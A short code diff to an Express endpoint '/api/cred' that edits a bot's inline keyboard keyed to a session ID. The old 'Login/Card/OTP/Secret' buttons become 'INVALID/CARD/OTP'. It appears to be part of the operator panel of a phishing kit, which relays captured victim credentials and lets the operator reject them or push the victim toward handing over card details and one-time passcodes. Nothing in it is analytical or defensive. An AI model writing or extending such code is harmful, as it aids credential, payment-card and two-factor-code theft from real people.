@@ -87,10 +87,9 @@ app.post('/api/cred', upload.none(), (req, res) => {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: 'Login', callback_data: `cred:${sessionId}` },
-                    { text: 'Card', callback_data: `card:${sessionId}` },
-                    { text: 'OTP', callback_data: `otp:${sessionId}` },
-                    { text: 'Secret', callback_data: `secret:${sessionId}` },
+                    { text: '❌ INVALID', callback_data: `credinvalid:${sessionId}` },
+                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
+                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
                 ],
             ],
         },
